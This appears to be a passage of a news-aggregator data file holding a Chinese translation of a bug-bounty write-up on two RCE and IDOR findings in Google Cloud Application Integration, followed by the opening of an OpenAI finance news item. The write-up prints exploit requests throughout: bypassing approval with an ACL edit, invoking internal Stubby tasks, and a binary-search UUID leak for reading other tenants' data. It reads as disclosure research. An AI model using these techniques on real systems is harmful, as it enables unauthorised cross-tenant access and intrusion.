+          "POST /v1/integrationPlatform:publishWorkflow HTTP/2\nHost: cloudcrmipfrontend-pa.clients6.google.com\nCookie: <redacted>\nAuthorization: SAPISIDHASH <redacted>\nOrigin: https://console.cloud.google.com\nX-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE\nContent-Type: application/json\n\n{\n  \"workflowId\": \"53b2a49c-dd5e-4e45-829b-61a3b2e8ff6e\"\n}",
+          "响应",
+          "{\n  \"error\": {\n    \"code\": 403,\n    \"message\": \"Publisher admin@gvrptest.cry.dev cannot be the same as the last editor admin@gvrptest.cry.dev of the integration my-new-workflow-test with snapshot number 1 and integration ID 53b2a49c-dd5e-4e45-829b-61a3b2e8ff6e being edited from the UI. Please raise a Request to Publish and have your change approved by another person.\",\n    \"status\": \"PERMISSION_DENIED\"\n  }\n}",
+          "我需要以某种方式向工作流添加另一个用户，并用它来发布。当时，我曾尝试使用 ACL 端点添加另一个账户，但没有正确设置权限。",
+          "改变一切的 DM",
+          "在我最初报告这个问题的一个多月后，我和几位研究人员在一个 Discord 群聊中开玩笑说我在 Google 中发现了一个可以泄露 protobuf 定义的漏洞：",
+          "这时，shrugged 说他也有同样的 bug，我们的讨论就此展开。",
+          "原来，shrugged 在研究另一个漏洞时，也在调查这个 API，并在 Application Integration 的 JavaScript 文件中注意到这些端点。他发现了 GenericStubbyTypedTask 作为潜在 RCE 向量，但在初始草稿工作流创建时没有有效的 client_id 卡住了。",
+          "而我从配额队列泄漏中获得了 client_id，但在发布步骤上卡住了。我们迅速交换了笔记：我分享了 client_id: \"default\" 以及我遇到障碍的地方，然后继续前进。",
+          "Google 已经从我最初的报告中推出了修复措施，因此许多原始端点现在返回 PERMISSION_DENIED。但我们注意到一个有趣的现象——许多端点在服务名称不同的情况下有 1:1 的有效对应端点：",
+          "最初的修复仅屏蔽了原始的“WorkflowEditorService”端点，但这些对应端点并未受影响。问题出在 createDraftWorkflow——我们找不到它的对应端点，并且它返回的是 PERMISSION_DENIED：",
+          "{\n  \"error\": {\n    \"code\": 403,\n    \"message\": \"The caller does not have permission\",\n    \"status\": \"PERMISSION_DENIED\"\n  }\n}",
+          "奇怪的是，当 shrugged 尝试相同的请求时，他第一次就成功了，而我却始终收到 PERMISSION_DENIED。这时我恍然大悟：修复尚未完全传播到所有负载均衡的后端。通过反复发送相同的请求，我们可以可靠地路由到仍允许通过的后台服务器：",
+          "HTTP/2 200 OK\nContent-Type: application/json; charset=UTF-8\n\n{ \"workflow\": { \"workflowId\": \"c6141c63-ac7a-4350-b582-7615ef045d0c\", \"name\": \"retest\", \"origin\": \"UI\", \"creatorEmail\": \"admin@gvrptest.cry.dev\", \"createdTime\": \"...\", \"lastModifiedTime\": \"...\", \"status\": \"DRAFT\", \"snapshotNumber\": \"1\", \"tags\": [ \"HEAD\" ], \"lockedBy\": \"admin@gvrptest.cry.dev\", \"lockedAtTime\": \"...\", \"lastModifierEmail\": \"admin@gvrptest.cry.dev\", \"clientId\": \"default\" } }",
+          "不过，任务名 GenericStubbyTypedTask 似乎并不存在。通过查看 /v1/integrationPlatform:listTaskEntities 的响应（使用 getProtoDefinition 获取的 proto 定义解码），发现其仅返回带有 IO_TEMPLATE 的任务。",
+          "{\n  \"taskEntities\": [\n    {\n      \"metadata\": {\n        \"name\": \"Delete SFDC Record\",\n        \"descriptiveName\": \"Delete Salesforce Record\",\n        \"description\": \"Deletes a record in Salesforce\",\n        \"g3DocLink\": \"https://g3doc.corp.google.com/company/teams/cloudcrm/platform/user_guide/tasks/write_to_sfdc.md#delete-sfdc-record-task\",\n        \"iconLink\": \"https://gstatic.com/enterprise/crm/eventbus/images/icons/blue/salesforce_009EDB_48px_1_blue.svg\",\n        \"codeSearchLink\": \"https://cs.corp.google.com/piper///depot/google3/java/com/google/enterprise/crm/eventbus/connectors/generic/impl/GenericRestV2TaskImpl.java\",\n      ...\n      },\n      \"paramSpecs\": {\n        \"parameters\": [\n          {\n            \"key\": \"salesforceDomain\",\n            \"dataType\": \"STRING_VALUE\",\n            \"className\": \"java.lang.String\",\n            \"config\": {\n              \"descriptivePhrase\": \"Check in Salesforce: Setup > Company Settings > My Domain. If you don't have My Domain enabled, please use \\\"yourinstance.salesforce.com\\\" as the Salesforce domain.\",\n              \"label\": \"Salesforce domain\",\n              \"uiPlaceholderText\": \"e.g. yourDomain.my.salesforce.com\"\n            },\n            \"required\": 1\n          },\n        ...\n        ]\n      },\n      ...\n      \"taskType\": \"IO_TEMPLATE\"\n    },\n    ...\n  ]\n}",
+          "看起来 GenericStubbyTypedTask 很可能是底层 ASIS_TEMPLATE 的一部分：",
+          "{\n  \"taskType\": {\n      \"description\": \"Defines the type of the task\",\n      \"enum\": [\n        \"TASK\",\n        \"ASIS_TEMPLATE\",\n        \"IO_TEMPLATE\"\n      ],\n      \"enumDescriptions\": [\n        \"Normal IP task\",\n        \"Task is of As-Is Template type\",\n        \"Task is of I/O template type with a different underlying task\"\n      ],\n      \"type\": \"string\"\n  }\n}",
+          "有趣的是，该端点的底层 RPC 是 google.internal.cloud.crm.ipfrontend.v1.WorkflowEditorService/ListTaskEntities。这与公开产品 Application Integration 的 /$rpc/google.cloud.integrations.v1alpha.Integrations/ListTaskEntities 极为相似，但后者也未直接返回任何 ASIS_TEMPLATE 任务。",
+          "回顾 Cloud Console 中 Application Integration 的 JS 代码：",
+          "[\"Vertex AI - Predict\",\"https://www.gstatic.com/enterprise/crm/eventbus/images/icons/custom_tasks/document_ai.png\"],\n[\"GenericStubbyTypedTaskV2\",\"http://gstatic.com/enterprise/crm/eventbus/images/icons/blue/stubby_48px_blue.svg\"],\n[\"RunGoogleSqlPlxQueryTask\",\"https://fonts.gstatic.com/s/i/productlogos/plx/v6/192px.svg\"],\n[\"ConvertDremelResultToJsonTask\",\"https://www.gstatic.com/images/icons/material/system/2x/settings_googblue_24dp.png\"],",
+          "确切的任务名是 GenericStubbyTypedTaskV2，甚至自带专属图标：",
+          "尝试在 Application Integration 中配置 GenericStubbyTypedTask 时，错误提示揭示了所需字段：",
+          "{\n  \"error\": {\n    \"code\": 400,\n    \"message\": \"'Required input key serverSpec not present in task GenericStubbyTypedTaskImpl, task number 1.'\",\n    \"status\": \"INVALID_ARGUMENT\"\n  }\n}",
+          "逐一补全缺失的键后，发现需要 serverSpec、serviceName 和 serviceMethod 参数。这些参数同样适用于 GenericStubbyTypedTaskV2。参考 Ezequiel Pereira 的 protobuf 仓库，并结合另一份泄露文档中的 GSLB 地址，我们将任务配置为调用 gslb:alkali-base 上的 /ServerStatus.GetServices：",
+          "趣味事实：Alkali 是 Google 内部框架，Google 员工可用它快速启动生产级 API，且常存在大量安全问题。",
+          "HTTP/2 200 OK\nContent-Type: application/json; charset=UTF-8\n\n{\"workflow\": {\"workflowId\": \"f91833bf-eacb-43ac-8490-099fef977e19\", \"name\": \"retest-test123\", \"taskConfigs\": [{\"taskName\": \"GenericStubbyTypedTaskV2\", \"taskNumber\": \"1\", \"parameters\": {\"response\": {\"key\": \"response\", \"value\": {\"stringValue\": \"$response$\"}, \"dataType\": \"STRING_VALUE\"}, \"serverSpec\": {\"key\": \"serverSpec\", \"value\": {\"stringValue\": \"gslb:alkali-base\"}, \"dataType\": \"STRING_VALUE\"}, \"serviceName\": {\"key\": \"serviceName\", \"value\": {\"stringValue\": \"ServerStatus\"}, \"dataType\": \"STRING_VALUE\"}, \"serviceMethod\": {\"key\": \"serviceMethod\", \"value\": {\"stringValue\": \"GetServices\"}, \"dataType\": \"STRING_VALUE\"}}, \"position\": {\"x\": -716, \"y\": -445}, \"label\": \"Stubby Internal\", \"incomingEdgeCount\": 1, \"taskType\": \"ASIS_TEMPLATE\", \"externalTaskType\": \"NORMAL_TASK\"}], \"triggerConfigs\": [{\"startTasks\": [{\"taskNumber\": \"1\"}], \"properties\": {\"Trigger name\": \"my-api-trigger-123\"}, \"triggerType\": \"API\", \"triggerNumber\": \"1\", \"enabledClients\": [\"default\"], \"triggerId\": \"api_trigger/my-api-trigger-123\"}], \"origin\": \"UI\", \"creatorEmail\": \"<REDACTED>\", \"createdTime\": \"2026-01-12T09:45:55.896951Z\", \"lastModifiedTime\": \"2026-01-12T09:45:55.896951Z\", \"status\": \"DRAFT\", \"snapshotNumber\": \"1\", \"tags\": [\"HEAD\"], \"lockedBy\": \"<REDACTED>\", \"lockedAtTime\": \"2026-01-12T09:45:55.896951Z\", \"lastModifierEmail\": \"<REDACTED>\", \"clientId\": \"default\"}}",
+          "这里的一切与 Application Integration 惊人地相似——工作流结构、任务配置，甚至发布和运行流程。注意到我们工作流中的 \"position\": {\"x\": -716, \"y\": -445} 吗？内部 UI 很可能与 Application Integration 的可视化编辑器类似，本质上是在设置任务坐标位置：",
+          "还记得之前因 ACL 问题无法发布的阻碍吗？最终发现只需更新 IP_EVENTBUS_WORKFLOWS 的 ACL，用两个攻击者控制的 Google 账户的混淆 Gaia ID 即可绕过限制：",
+          "Request",
+          "POST /v1/integrationPlatform/auth:setAcl HTTP/2\nHost: cloudcrmipfrontend-pa.clients6.google.com\nCookie: <redacted>\nAuthorization: <redacted>\nOrigin: https://console.cloud.google.com\nX-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE\nContent-Type: application/json\nContent-Length: 500\n\n{\"resourceInfo\": {\"resource\": \"IP_EVENTBUS_WORKFLOWS\", \"id\": \"retest-test123\"}, \"acl\": {\"entries\": [{\"scope\": {\"obfuscatedGaiaId\": \"100029910836469267942\"}, \"role\": 105}, {\"scope\": {\"obfuscatedGaiaId\": \"113728935872649341310\"}, \"role\": 105}]}}",
+          "Response",
+          "HTTP/2 200 OK\nContent-Type: application/json; charset=UTF-8\n\n{}",
+          "首先，使用第一个攻击者 Google 账户切换了发布工作流的请求：",
+          "POST /v1/integrationPlatform/workflowdeployment:toggleRequestToPublishWorkflow HTTP/2\nHost: cloudcrmipfrontend-pa.clients6.google.com\n...\n\n{\"workflowId\": \"f91833bf-eacb-43ac-8490-099fef977e19\"}",
+          "随后，用第二个攻击者账户成功发布了工作流：",
+          "POST /v1/integrationPlatform/workflowdeployment:publishWorkflow HTTP/2\nHost: cloudcrmipfrontend-pa.clients6.google.com\n...\n\n{\"workflowId\": \"f91833bf-eacb-43ac-8490-099fef977e19\"}",
+          "配置了 serverSpec 为 gslb:alkali-base、service/method 为 /ServerStatus.GetServices 的 GenericStubbyTypedTaskV2 工作流执行后，我们得以运行 Stubby 查询：",
+          "...\n{\n    \"protoValue\": {\n    \"@type\": \"type.googleapis.com/rpc.ServiceList\",\n    \"service\": [\n        {\n        \"name\": \"AlkaliBaseAccountService\",\n        \"descriptor\": {\n            \"filename\": \"google/internal/alkali/base/v1/alkali_base_account_service.proto\",\n            \"name\": \"AlkaliBaseAccountService\",\n            \"method\": [\n            {\n                \"name\": \"ListAccounts\",\n                \"argumentType\": \"google.internal.alkali.base.v1.ListAccountsRequest\",\n                \"resultType\": \"google.internal.alkali.base.v1.ListAccountsResponse\",\n                \"deadline\": 30,\n                \"securityLevel\": \"none\"\n            },\n            {\n                \"name\": \"ListAccessibleAccounts\",\n                \"argumentType\": \"google.internal.alkali.base.v1.ListAccessibleAccountsRequest\",\n                \"resultType\": \"google.internal.alkali.base.v1.ListAccountsResponse\",\n                \"deadline\": 30,\n                \"securityLevel\": \"none\"\n            },\n            ...",
+          "随后将初始漏洞报告升级为 RCE 漏洞。若非两人协作，且时机恰好——我们的 PoC 演示后仅一小时，createDraftWorkflow 修复就已完全生效——否则这一 RCE 漏洞可能永远停留在理论阶段。不过，Google 在真正能利用服务器执行代码前就切断了连接。",
+          "Timeline (1st RCE)",
+          "2025-12-01 - 向 Google 提交初始报告",
+          "2025-12-01 - Google 将报告标记为 P0/S0 优先级",
+          "2025-12-01 - 🎉 精彩发现！",
+          "2026-01-12 - 告知 Google 安全团队关于 RCE 升级情况",
+          "2026-01-12 - 更新报告并附上 RCE PoC 证明",
+          "2026-01-12 - Google 升级报告处理级别",
+          "2026-01-16 - 评审团奖励 $60,000。裁决理由：本报告质量极佳！漏洞类别为“Google Cloud 生产环境遭入侵”。无需攻击者与受害者交互的漏洞。默认 Google Cloud 产品。",
+          "Round 2 (3 months later)",
+          "你以为事情就此结束，但没那么简单。三个月后，我的模糊测试工具（fuzzer）提醒我在公共应用集成产品的公共API中发现了一些IDOR漏洞。",
+          "结果发现，在整个API中，URL里可以引用自己的项目ID，但也可以引用他人的UUID：",
+          "GET /v1/projects/<your-project>/locations/us-central1/integrations/anythinghere/versions/<victim-uuid> HTTP/2\nHost: integrations.googleapis.com\nAuthorization: Bearer <redacted>",
+          "API会欣然返回受害者的资源，因为认证检查是基于你的项目ID（你有权访问自己的项目），但没有检查该ID是否真的属于你的项目。",
+          "不过仅凭这一点影响有限，因为这些是UUIDv4。搜索空间太大（10^36量级），无法有效暴力破解。因此我开始寻找任何可能泄露受害者资源UUID的方法。",
+          "这时我注意到一个有趣的“测试用例”功能。文档中写道：",
+          "通过应用集成，你可以在复杂集成中创建并运行多个测试用例，这些集成连接和管理Google Cloud服务及其他业务应用。通过测试集成流程，你可以确保其按预期工作。",
+          "有趣的是，当你在前端查看测试用例加载方式时，浏览器会发送类似这样的请求：",
+          "POST /$rpc/google.cloud.integrations.v1alpha.TestCases/ListTestCases HTTP/2\nHost: us-central1-integrations.clients6.google.com\nContent-Type: application/x-protobuf\n\n< RAW PROTOBUF DATA >",
+          "实际请求负载是protobuf格式，我已解码以便展示其结构：",
+          "{\n  \"1\": \"projects/eastern-camp-489414-j3/locations/us-central1/integrations/RestTaskTest/versions/631a0566-02fc-4dce-b319-25e2c68168f4\",\n  \"2\": \"workflow_id = 631a0566-02fc-4dce-b319-25e2c68168f4\",\n  \"6\": {\n    \"1\": [\"name\", \"display_name\", \"update_time\", \"client_id\"]\n  }\n}",
+          "字段1是父资源路径（我的项目、我的版本UUID），字段6是响应字段掩码，而字段2 workflow_id = 631a0566-02fc-4dce-b319-25e2c68168f4似乎是一种过滤器。如果省略它，是否会返回所有工作流的测试用例？显然不会……",
+          "从请求中删除字段2和6：",
+          "{\n  \"1\": \"projects/eastern-camp-489414-j3/locations/us-central1/integrations/RestTaskTest/versions/631a0566-02fc-4dce-b319-25e2c68168f4\"\n}",
+          "响应返回了其他所有GCP项目的测试用例：",
+          "{\n  \"testCases\": [\n    {\n      \"name\": \"projects/331540621401/locations/us-central1/integrations/my-draft-integration/versions/631a0566-02fc-4dce-b319-25e2c68168f4/testCases/b25fb963-792c-419d-a98b-eb930b2a29e3\",\n      \"displayName\": \"test\",\n      \"triggerId\": \"api_trigger/AI_bebbia_CreateWOSubs_API_1\",\n      \"testInputParameters\": [\n        {\n          \"key\": \"InputData\",\n          \"dataType\": \"JSON_VALUE\",\n          \"defaultValue\": {\n            \"jsonValue\": \"{\\n  \\\"OldSKU\\\": \\\"300465\\\",\\n  \\\"orderid\\\": \\\"7fe9ffa9-d122-484b-96df-9ef85cd3aa8a\\\",\\n  ...\\n}\"\n          },\n          \"displayName\": \"InputData\"\n        }\n      ],\n      \"creatorEmail\": \"redacted@google.com\",\n      ...\n    }\n  ]\n}",
+          "仔细查看响应会发现异常：每个结果中的versions/...段都是631a0566-02fc-4dce-b319-25e2c68168f4——这是我的版本UUID，即字段1中发送的值。API直接将这个值反射到每个测试用例名称中，尽管这些测试用例完全属于不同项目中的不同集成。",
+          "虽然我现在拥有所有GCP项目中每个测试用例的ID及其集成名称和创建者邮箱，但之前IDOR漏洞所需的真实受害者版本UUID并未出现在响应中。",
+          "即便如此，仅测试用例ID已能造成实际影响。应用集成暴露了一个`:executeTest`端点，可通过ID直接运行测试用例，且不需要受害者的真实版本UUID。",
+          "请求",
+          "POST /v1/projects/<your-project>/locations/us-central1/integrations/x/versions/-/testCases/035c64d6-ea04-436d-8674-862f51191953:executeTest HTTP/2\nHost: integrations.googleapis.com\nAuthorization: Bearer <redacted>\nContent-Length: 0",
+          "响应",
+          "{\n  \"executionId\": \"5d49abed-7692-47aa-8660-5cdaea92d2af\",\n  \"outputParameters\": {\n    \"output\": 3\n  },\n  \"assertionResults\": [\n    {\n      \"assertion\": {\n        \"assertionStrategy\": \"ASSERT_EQUALS\",\n        \"parameter\": {\n          \"key\": \"output\",\n          \"value\": { \"intValue\": \"3\" }\n        }\n      },\n      \"taskNumber\": \"1\",\n      \"taskName\": \"JsonnetMapperTask\",\n      \"status\": \"SUCCEEDED\"\n    }\n  ],\n  \"testExecutionState\": \"PASSED\"\n}",
+          "因此我本就能触发任意测试用例在受害者环境中执行，但真正目标仍是通过之前的IDOR漏洞访问受害者整个集成，为此我需要真实的版本UUID。",
+          "我卡了一会儿，直到灵光一现。过滤器参数（字段2）显然支持=等比较运算符，那是否也支持>和<=？如果是的话，我可以锚定一个已知测试用例ID，然后对workflow_id字段逐字符进行二分搜索，最终还原完整UUID：",
+          "id = \"<known-tc-uuid>\" AND workflow_id > \"<low>\" AND workflow_id <= \"<high>\"",
+          "每次请求都会缩小范围。若测试用例仍出现在响应中，则真实workflow_id在(low, high]区间内，否则在外。理论上，32位十六进制UUID约需128次请求即可定位。",
+          "我让Claude为此编写概念验证代码，首次尝试就完美生效：",
+          "$ python extract_by_id.py --token \"<redacted>\" --project 273897706296 --location \"us-central1\" --tc-id \"60413427-4d07-4c36-bce0-66cfcdd81879\"\nTest case: 60413427-4d07-4c36-bce0-66cfcdd81879\nParent:    projects/273897706296/locations/us-central1/integrations/x/versions/-\n\nVerified: target found. Starting binary search...\n\n  [ 4/32] fb1d0000-0000-0000-0000-000000000000  (16 reqs)\n  [ 8/32] fb1dc5f3-0000-0000-0000-000000000000  (32 reqs)\n  [12/32] fb1dc5f3-0380-0000-0000-000000000000  (48 reqs)\n  [16/32] fb1dc5f3-0380-491c-0000-000000000000  (64 reqs)\n  [20/32] fb1dc5f3-0380-491c-af90-000000000000  (80 reqs)\n  [24/32] fb1dc5f3-0380-491c-af90-5a1400000000  (96 reqs)\n  [28/32] fb1dc5f3-0380-491c-af90-5a141aa00000  (112 reqs)\n  [32/32] fb1dc5f3-0380-491c-af90-5a141aa02f56  (128 reqs)\n\nworkflow_id: fb1dc5f3-0380-491c-af90-5a141aa02f56\nTotal requests: 128",
+          "现在我有了受害者实际的集成版本 UUID。将其与 GetIntegrationVersion IDOR 链式调用：",
+          "GET /v1/projects/<your-project>/locations/us-central1/integrations/x/versions/fb1dc5f3-0380-491c-af90-5a141aa02f56 HTTP/2\nHost: integrations.googleapis.com\nAuthorization: Bearer <redacted>",
+          "返回了属于不同项目的完整集成，包括所有触发器配置、任务配置、参数绑定和创建者邮箱：",
+          "{\n  \"name\": \"projects/<your-project>/locations/us-central1/integrations/TestCasePOC5/versions/fb1dc5f3-0380-491c-af90-5a141aa02f56\",\n  \"state\": \"DRAFT\",\n  \"triggerConfigs\": [\n    {\n      \"label\": \"API Trigger\",\n      \"triggerType\": \"API\",\n      \"triggerId\": \"api_trigger/TestCasePOC5_API_1\"\n    }\n  ],\n  \"taskConfigs\": [\n    {\n      \"task\": \"GenericRestV2Task\",\n      \"displayName\": \"Call REST Endpoint\",\n      \"parameters\": {\n        \"url\": { \"key\": \"url\", \"value\": { \"stringValue\": \"$url$\" } },\n        \"httpMethod\": { \"key\": \"httpMethod\", \"value\": { \"stringValue\": \"POST\" } },\n        \"authConfigName\": { \"key\": \"authConfigName\", \"value\": { \"stringValue\": \"authprofiletest\" } }\n      }\n    }\n  ],\n  ...\n  \"integrationParameters\": [\n    { \"key\": \"url\", \"dataType\": \"STRING_VALUE\", \"defaultValue\": { \"stringValue\": \"https://example.com\" } }\n  ],\n  \"lastModifierEmail\": \"gvrptest4@gmail.com\",\n  \"createTime\": \"2026-03-22T11:10:30.087Z\"\n}",
+          "如果你还记得最初测试用例的转储结果，其中不少 creatorEmail 字段以 @google.com 结尾。这说明有很多 Google 内部团队在这个平台上运行自己的集成。我的下一个显而易见的问题是：如果这些 Googler 集成的任务中已经配置了 GenericStubbyTypedTaskV2（或其他仅限内部的任务如 PythonTask、CreateBuganizerIssueTask 等）会怎样？任何一个任务都会将这种跨租户链式调用升级为更严重的情况。",
+          "但我实际上无法检查。这样做意味着要遍历真实的客户数据，这违反了 Google VRP 规则，所以我将所有收集到的信息打包后提交给了 Cloud VRP。",
+          "配置内部任务类型",
+          "这让我想到，到底是什么阻止我使用内部任务类型创建自己的集成呢？",
+          "如果我尝试创建一个内部任务：",
+          "POST /v1/projects/273897706296/locations/us-central1/integrations/ExampleTest1234/versions HTTP/2\nHost: integrations.googleapis.com\nAuthorization: Bearer <redacted>\nContent-Length: 1033\n\n{\n  \"taskConfigsInternal\": [\n    {\n      \"taskNumber\": \"1\",\n      \"taskName\": \"PythonTask\",\n      ...\n      \"taskEntity\": {\n        \"uiConfig\": {\n          \"taskUiModuleConfigs\": [\n            {\n              \"moduleId\": \"RPC_TYPED\"\n            }\n          ]\n        }\n      },\n      \"taskType\": \"ASIS_TEMPLATE\",\n      \"parameters\": {\n        \"TEST\": {\n          \"key\": \"test\",\n          \"value\": {\n            \"stringValue\": \"test\"\n          }\n        }\n      }\n    }\n  ],\n  ...\n}",
+          "它竟然可以正常工作：",
+          "HTTP/2 200 OK\nContent-Type: application/json; charset=UTF-8\n\n{\n  \"name\": \"projects/273897706296/locations/us-central1/integrations/ExampleTest1234/versions/304adc1b-6d09-4b2d-a070-db48b821879a\",\n  \"origin\": \"UI\",\n  \"snapshotNumber\": \"1\",\n  \"updateTime\": \"2026-05-01T07:30:07.182512Z\",\n  \"lockHolder\": \"gvrptest4@gmail.com\",\n  \"createTime\": \"2026-05-01T07:30:07.182512Z\",\n  \"lastModifierEmail\": \"gvrptest4@gmail.com\",\n  \"state\": \"DRAFT\",\n  ...\n}",
+          "但当我真正尝试执行工作流时，它会超时并出现以下错误：",
+          "Execution timeout, cancelled graph execution. The default timeout is 2min for sync execution and 10min for async execution. If you are using sync execution, please try async execution such as the Schedule API or Cloud Scheduler trigger. If you are already using async execution, please try to break down your integration into smaller pieces and chain them in the async way. Note any variable contains large data will also failed to upload to GCS. error/code: 'common_error_code: SYNC_EVENTBUS_EXECUTION_TIMEOUT''",
+          "然而，我发现了一个奇怪的现象。当我配置了 PythonTask（一种内部任务），创建了测试用例并执行该测试用例时，没有发生超时，而是在前端出现了可疑的错误：",
+          "{\n  \"1\": 9,\n  \"2\": \"java.io.IOException: No space left on device\"\n}",
+          "这是一个来自执行后端的真实异常，而非超时。无论测试用例功能运行的是哪条代码路径，它都足够深入，最终因实际磁盘 I/O 操作失败。用同样的方法对 GenericStubbyTypedTaskV2 进行测试，得到了信息较少但同样可疑的结果：",
+          "Failed to execute test case. Error: Unknown Error.",
+          "我查看了工作流执行日志，这时真正的错误才显现出来：",
+          "{ \"message\": \"com.google.security.authentication.common.CredentialsUnsupportedException: UberMint verification is disabled. You can enable it in AuthenticationMethods; RpcSecurityPolicy http://rpcsp/p/4aPF9XD3vQ_2KYxu2J59zxrLEzDa2CDMRzIYnrADC4w \", \"code\": 500 }",
+          "这非常可疑。我肯定发现了什么。通过访问：",
+          "GET /v1/projects/<project>/locations/us-west1/integrations/ExampleTest1234:1/executions/id:download\nHost: integrations.googleapis.com",
+          "我可以获取完整的堆栈跟踪：",
+          "com.google.enterprise.crm.exceptions.IpCanonicalCodeException: com.google.enterprise.crm.eventbus.testcase.task.mock.MockExecutionFailureException: com.google.net.rpc3.client.RpcClientException: <eye3 title='/EventbusStubbyCallerService.ExecuteStubbyCall, UNAUTHENTICATED'/> APPLICATION_ERROR;enterprise.crm.eventbus.stubby/EventbusStubbyCallerService.ExecuteStubbyCall;com.google.security.authentication.common.CredentialsUnsupportedException: UberMint verification is disabled. You can enable it in AuthenticationMethods; RpcSecurityPolicy http://rpcsp/p/4aPF9XD3vQ_2KYxu2J59zxrLEzDa2CDMRzIYnrADC4w ;AppErrorCode=16;StartTimeMs=1774319566778;unknown;ResFormat=uncompressed;ServerTimeSec=0.00194812;LogBytes=256;FailFast;EffSecLevel=none;ReqFormat=uncompressed;ReqID=bea3d76b582d8a4;GlobalID=0;Server=[2002:a05:6670:4003:b0:ced:80ad:4c54]:4001 Code: FAILED_PRECONDITION\n\tat app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.serialize(EventParametersUtil.java:744)\n\tat app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.serialize(EventParametersUtil.java:725)\n\tat app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.toParameterValueType(EventParametersUtil.java:654)\n\tat app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.lambda$addEventParametersToEventMessage$0(EventParametersUtil.java:475)\n\tat /java.base@25.0.1/java.util.stream.ReferencePipeline$3$1.accept(Unknown Source)\n  ...",
+          "由此可知，我们的变量被直接插入到后端的 ExecuteStubbyCallRequest 中。根据尝试不同参数值时的堆栈跟踪，我推测后端代码大致如下：",
+          "GenericStubbyTypedTaskV2.buildRequest():\n    line 219: setServerAddress(serverSpec)  → ExecuteStubbyCallRequest.java:1123\n    line 220: setServiceName(serviceName)   → ExecuteStubbyCallRequest.java:1219\n    line 221: setMethodName(serviceMethod)  → ExecuteStubbyCallRequest.java:1313\n    ...",
+          "那么是否有一些参数需要提供才能让它生效？问题是堆栈跟踪仅帮助我泄露了三个已知参数 serverSpec、serviceName 和 serviceMethod，但从这个方法我无法找到更多参数。此外，Google 将这些 RCE 升级视为安全事件，因此在进一步行动前，我向 Google 的安全团队请求许可。他们很快回复确认这是可攻击的漏洞，并要求我停止进一步的测试。",
+          "报告迅速升级到 P0/S0 级别，获得了 🎉Nice catch! 的表扬。近一个月后，该报告因在“Google Cloud 生产环境遭入侵”类别下获得 $75,000 奖金，成为我目前单笔最高赏金。",
+          "通过与一些 Googlers 交流，我了解到在 Cloud VRP 表中基础 RCE 赔付大致分为三个等级：",
+          "$50k：相对低权限的生产用户访问",
+          "$75k：高权限的生产用户访问",
+          "$100k：Google Cloud 管理员",
+          "任何具体的 RCE 漏洞在这三级中的定位完全取决于被攻破的生产身份能直接触及多少生产环境。显然，由于从生产访问中可以访问的巨大攻击面，几乎任何初始访问都可能通过权限提升进一步扩大影响。",
+          "谷歌对于此处具体原因的解释含糊其辞，但内部团队调查显示该漏洞在生产环境中的影响远超我之前预估的，最终导致其被评定为7.5万美元级别。",
+          "时间线（第二次远程代码执行）",
+          "2026年3月21日 - 向谷歌提交初始报告",
+          "2026年3月23日 - 谷歌将报告归类为P1/S1级",
+          "2026年3月23日 - 告知谷歌安全团队关于RCE升级情况",
+          "2026年3月23日 - 🎉 真棒！报告升级为P0/S0级",
+          "2026年4月28日 - 评审组授予7.5万美元奖金。决策依据：漏洞类别为\"Google Cloud生产环境遭破坏\"。无需攻击者与受害者交互即可利用的漏洞。默认Google Cloud产品。",
+          "2026年5月6日 - 告知谷歌GetIntegrationVersion RPC仍存在漏洞",
+          "2026年5月8日 - 评审组追加授予13,337美元奖金。决策依据：漏洞类别为\"单服务权限提升-写入权限\"。无需攻击者与受害者交互即可利用的漏洞。默认Google Cloud产品。"
+        ]
+      },
+      "fromDate": "2026-05-23"
+    },
+    {
+      "slug": "b1eb39713164f91b",
+      "title": "News: OpenAI Had A Negative 122% Non-GAAP Operating Margin In Q1 2026, and ChatGPT Growth Has Stalled",
+      "titleZh": "OpenAI Q1 2026营收57亿美元但亏损率达122%",
+      "link": "https://www.wheresyoured.at/news-openai-had-a-negative-122-operating-margin-in-q1-2026-and-chatgpt-growth-has-stalled/",
+      "sourceName": "wheresyoured.at",
+      "sourceUrl": "https://wheresyoured.at",
+      "pubDate": "2026-05-22T14:21:18.000Z",
+      "category": "ai-ml",
+      "keywords": [
+        "OpenAI",
+        "financials",
+        "operating margin",
+        "ChatGPT"
+      ],
+      "score": {
+        "relevance": 9,
+        "quality": 8,
+        "timeliness": 10,
+        "total": 27
+      },
+      "summary": "据The Information报道，OpenAI在2026年第一季度营收达57亿美元，但经调整后的运营亏损率高达-122%，即每赚取1美元收入就额外损失1.22美元。这一数据反映了其高昂的运营成本与商业化挑战，同时ChatGPT用户增长已停滞。",
+      "summaryEn": "OpenAI reported $5.7 billion revenue in Q1 2026 but suffered an adjusted operating margin of -122%, meaning it lost $1.22 for every dollar earned. This highlights massive operational costs and commercialization challenges amid stagnant ChatGPT user growth.",
+      "reason": "揭示了AI公司盈利模式的严峻现实，对投资者和行业观察者具有重要参考价值。",
+      "fullTextStatus": "ok",
+      "fullText": {
+        "byline": "Ed Zitron",
+        "siteName": "Ed Zitron's Where's Your Ed At",
+        "partial": false,
+        "blocks": [
+          {
+            "type": "h2",
+            "text": "Executive Summary:"
+          },
+          {
+            "type": "li",
+            "text": "The Information reports that OpenAI generated $5.7bn in revenue for the first quarter of 2026 based on discussions with sources familiar with its financials."
+          },
+          {
+            "type": "li",
+            "text": "With adjusted negative margins of -122%, this means that for every dollar of revenue OpenAI made, it lost an additional $1.22, or around $6.95bn on a non-GAAP basis.OpenAI is \"on track\" to hit goal of $30bn in 2026 revenue, but margins suggest losses of over $36.6bn."
+          },
+          {
+            "type": "li",
+            "text": "OpenAI continues to struggle converting free ChatGPT users to paying customers, and overall user growth has stalled."
+          },
+          {
+            "type": "p",
+            "text": "New revelations about OpenAI’s finances paint a dim picture for the company, as The Information reported it generated just $5.7bn in the first quarter of 2026, with an adjusted operating margin of -122%."
+          },
+          {
+            "type": "p",
+            "text": "This means that for every dollar of revenue the company generated, it lost $1.22."
+          },
+          {
+            "type": "p",
+            "text": "As The Information’s Sri Muppidi noted, these operating margins were adjusted — and, presumably, didn’t conform to GAAP (or generally accepted accounting principles) standards — and excluded certain “large line items”, like stock-based compensation."
+          },
+          {
+            "type": "p",
